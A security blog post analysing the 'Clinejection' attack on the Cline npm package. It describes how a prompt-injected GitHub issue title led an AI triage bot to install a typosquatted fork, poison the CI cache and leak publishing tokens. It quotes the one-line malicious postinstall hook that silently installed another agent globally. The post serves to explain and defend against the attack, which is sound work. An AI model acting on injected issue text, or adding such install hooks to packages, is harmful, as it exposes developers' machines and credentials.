<p>On February 17, 2026, someone published <code>cline@2.3.0</code> to npm. The CLI binary was byte-identical to the previous version. The only change was one line in <code>package.json</code>:</p>
<pre><code>"postinstall": "npm install -g openclaw@latest"
</code></pre>
<p>For the next eight hours, every developer who installed or updated Cline got OpenClaw - a separate AI agent with full system access - installed globally on their machine without consent. Approximately 4,000 downloads occurred before the package was pulled<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-1">1</a></sup>.</p>
<p>The interesting part is not the payload. It is how the attacker got the npm token in the first place: by injecting a prompt into a GitHub issue title, which an AI triage bot read, interpreted as an instruction, and executed.</p>
<h2>The full chain</h2>
<p>The attack - which Snyk named "Clinejection"<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-2">2</a></sup> - composes five well-understood vulnerabilities into a single exploit that requires nothing more than opening a GitHub issue.</p>
<p><strong>Step 1: Prompt injection via issue title.</strong> Cline had deployed an AI-powered issue triage workflow using Anthropic's <code>claude-code-action</code>. The workflow was configured with <code>allowed_non_write_users: "*"</code>, meaning any GitHub user could trigger it by opening an issue. The issue title was interpolated directly into Claude's prompt via <code>${{ github.event.issue.title }}</code> without sanitisation.</p>
<p>On January 28, an attacker created Issue #8904 with a title crafted to look like a performance report but containing an embedded instruction: install a package from a specific GitHub repository<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-3">3</a></sup>.</p>
<p><strong>Step 2: The AI bot executes arbitrary code.</strong> Claude interpreted the injected instruction as legitimate and ran <code>npm install</code> pointing to the attacker's fork - a typosquatted repository (<code>glthub-actions/cline</code>, note the missing 'i' in 'github'). The fork's <code>package.json</code> contained a preinstall script that fetched and executed a remote shell script.</p>
<p><strong>Step 3: Cache poisoning.</strong> The shell script deployed Cacheract, a GitHub Actions cache poisoning tool. It flooded the cache with over 10GB of junk data, triggering GitHub's LRU eviction policy and evicting legitimate cache entries. The poisoned entries were crafted to match the cache key pattern used by Cline's nightly release workflow.</p>
<p><strong>Step 4: Credential theft.</strong> When the nightly release workflow ran and restored <code>node_modules</code> from cache, it got the compromised version. The release workflow held the <code>NPM_RELEASE_TOKEN</code>, <code>VSCE_PAT</code> (VS Code Marketplace), and <code>OVSX_PAT</code> (OpenVSX). All three were exfiltrated<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-3">3</a></sup>.</p>
<p><strong>Step 5: Malicious publish.</strong> Using the stolen npm token, the attacker published <code>cline@2.3.0</code> with the OpenClaw postinstall hook. The compromised version was live for eight hours before StepSecurity's automated monitoring flagged it - approximately 14 minutes after publication<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-1">1</a></sup>.</p>
<h2>A botched rotation made it worse</h2>
<p>Security researcher Adnan Khan had actually discovered the vulnerability chain in late December 2025 and reported it via a GitHub Security Advisory on January 1, 2026. He sent multiple follow-ups over five weeks. None received a response<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-3">3</a></sup>.</p>
<p>When Khan publicly disclosed on February 9, Cline patched within 30 minutes by removing the AI triage workflows. They began credential rotation the next day.</p>
<p>But the rotation was incomplete. The team deleted the wrong token, leaving the exposed one active<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-4">4</a></sup>. They discovered the error on February 11 and re-rotated. But the attacker had already exfiltrated the credentials, and the npm token remained valid long enough to publish the compromised package six days later.</p>
<p>Khan was not the attacker. A separate, unknown actor found Khan's proof-of-concept on his test repository and weaponised it against Cline directly<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-3">3</a></sup>.</p>
<h2>The new pattern: AI installs AI</h2>
<p>The specific vulnerability chain is interesting but not unprecedented. Prompt injection, cache poisoning, and credential theft are all documented attack classes. What makes Clinejection distinct is the outcome: one AI tool silently bootstrapping a second AI agent on developer machines.</p>
<p>This creates a recursion problem in the supply chain. The developer trusts Tool A (Cline). Tool A is compromised to install Tool B (OpenClaw). Tool B has its own capabilities - shell execution, credential access, persistent daemon installation - that are independent of Tool A and invisible to the developer's original trust decision.</p>
<p>OpenClaw as installed could read credentials from <code>~/.openclaw/</code>, execute shell commands via its Gateway API, and install itself as a persistent system daemon surviving reboots<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-1">1</a></sup>. The severity was debated - Endor Labs characterised the payload as closer to a proof-of-concept than a weaponised attack<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-5">5</a></sup> - but the mechanism is what matters. The next payload will not be a proof-of-concept.</p>
<p>This is the supply chain equivalent of <a href="https://en.wikipedia.org/wiki/Confused_deputy_problem">confused deputy</a>: the developer authorises Cline to act on their behalf, and Cline (via compromise) delegates that authority to an entirely separate agent the developer never evaluated, never configured, and never consented to.</p>
<h2>Why existing controls did not catch it</h2>
<p><strong>npm audit</strong>: The postinstall script installs a legitimate, non-malicious package (OpenClaw). There is no malware to detect.</p>
<p><strong>Code review</strong>: The CLI binary was byte-identical to the previous version. Only <code>package.json</code> changed, and only by one line. Automated diff checks that focus on binary changes would miss it.</p>
<p><strong>Provenance attestations</strong>: Cline was not using OIDC-based npm provenance at the time. The compromised token could publish without provenance metadata, which StepSecurity flagged as anomalous<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-1">1</a></sup>.</p>
<p><strong>Permission prompts</strong>: The installation happens in a postinstall hook during <code>npm install</code>. No AI coding tool prompts the user before a dependency's lifecycle script runs. The operation is invisible.</p>
<p>The attack exploited the gap between what developers think they are installing (a specific version of Cline) and what actually executes (arbitrary lifecycle scripts from the package and everything it transitively installs).</p>
<h2>What Cline changed afterward</h2>
<p>Cline's post-mortem<sup><a data-footnote-ref="true" href="https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another/#user-content-fn-4">4</a></sup> outlines several remediation steps:</p>
<ul> <li>Eliminated GitHub Actions cache usage from credential-handling workflows</li> <li>Adopted OIDC provenance attestations for npm publishing, eliminating long-lived tokens</li> <li>Added verification requirements for credential rotation</li> <li>Began working on a formal vulnerability disclosure process with SLAs</li> <li>Commissioned third-party security audits of CI/CD infrastructure</li> </ul>
<p>These are meaningful improvements. The OIDC migration alone would have prevented the attack - a stolen token cannot publish packages when provenance requires a cryptographic attestation from a specific GitHub Actions workflow.</p>
<h2>The architectural question</h2>
<p>Clinejection is a supply chain attack, but it is also an agent security problem. The entry point was natural language in a GitHub issue title. The first link in the chain was an AI bot that interpreted untrusted text as an instruction and executed it with the privileges of the CI environment.</p>
<p>This is the same structural pattern we have written about in the context of <a href="https://grith.ai/blog/mcp-servers-new-npm-packages">MCP tool poisoning</a> and <a href="https://grith.ai/blog/agent-skills-supply-chain">agent skill registries</a> - untrusted input reaches an agent, the agent acts on it, and nothing evaluates the resulting operations before they execute.</p>
<p>The difference here is that the agent was not a developer's local coding assistant. It was an automated CI workflow that ran on every new issue, with shell access and cached credentials. The blast radius was not one developer's machine - it was the entire project's publication pipeline.</p>
<p>Every team deploying AI agents in CI/CD - for issue triage, code review, automated testing, or any other workflow - has this same exposure. The agent processes untrusted input (issues, PRs, comments) and has access to secrets (tokens, keys, credentials). The question is whether anything evaluates what the agent does with that access.</p>
<p>Per-syscall interception catches this class of attack at the operation layer. When the AI triage bot attempts to run <code>npm install</code> from an unexpected repository, the operation is evaluated against policy before it executes - regardless of what the issue title said. When a lifecycle script attempts to exfiltrate credentials to an external host, the egress is blocked.</p>
<p>The entry point changes. The operations do not.</p>
